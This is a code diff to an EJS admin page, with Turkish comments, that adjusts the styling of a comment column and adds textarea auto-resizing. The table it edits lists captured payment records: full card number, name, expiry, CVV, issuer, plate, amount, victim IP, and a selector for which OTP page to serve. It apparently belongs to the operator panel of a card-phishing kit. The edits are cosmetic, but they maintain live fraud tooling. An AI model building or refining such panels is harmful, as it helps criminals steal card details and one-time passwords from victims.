@@ -55,7 +55,7 @@
         <th>#</th><th>Date</th><th>Plate</th><th>Amount</th>
         <th>Card No</th><th>Name</th><th>Exp</th><th>CVV</th>
         <th>Issuer</th><th>Country</th><th>Type</th>
-        <th>OTP Page</th><th>Status</th><th>IP</th><th style="min-width:160px;">Comment</th><th>Actions</th>
+        <th>OTP Page</th><th>Status</th><th>IP</th><th style="width:130px;min-width:100px;">Comment</th><th>Actions</th>
       </tr>
     </thead>
     <tbody>
@@ -88,9 +88,9 @@
       <td><span class="badge b-otp"><%= p.otp_page || 'otp-sms' %></span></td>
       <td><span class="badge <%= sc %>"><%= p.otp_status %></span></td>
       <td class="mono muted small"><%= p.ip || '—' %></td>
-      <td>
+      <td style="width:130px;max-width:130px;">
         <textarea class="pay-comment" data-sid="<%= p.sid %>" rows="1"
-          style="width:100%;resize:none;border:1px solid #e2e8f0;border-radius:4px;padding:4px 8px;font-size:12px;min-width:120px;background:#f8fafc;color:#0f172a;font-family:inherit;"><%= p.comment || '' %></textarea>
+          style="width:100%;resize:none;border:1px solid var(--bd);border-radius:4px;padding:4px 8px;font-size:12px;background:var(--bg-input);color:var(--tx-base);font-family:inherit;overflow-y:hidden;word-break:break-word;white-space:pre-wrap;line-height:1.4;"><%= p.comment || '' %></textarea>
       </td>
       <td>
         <div class="action-bar">
@@ -135,6 +135,15 @@ function delPayment(sid) {
 }
 
 // ── Yorum kaydetme ───────────────────────────────────────────────────────────
+function autoResizeComment(ta) {
+  ta.style.height = 'auto';
+  ta.style.height = Math.min(ta.scrollHeight, 96) + 'px';
+}
+document.querySelectorAll('.pay-comment').forEach(function(ta) {
+  autoResizeComment(ta);
+  ta.addEventListener('input', function() { autoResizeComment(this); });
+});
+
 document.querySelectorAll('.pay-comment').forEach(function(ta) {
   ta.addEventListener('blur', async function() {
     const sid     = this.dataset.sid;
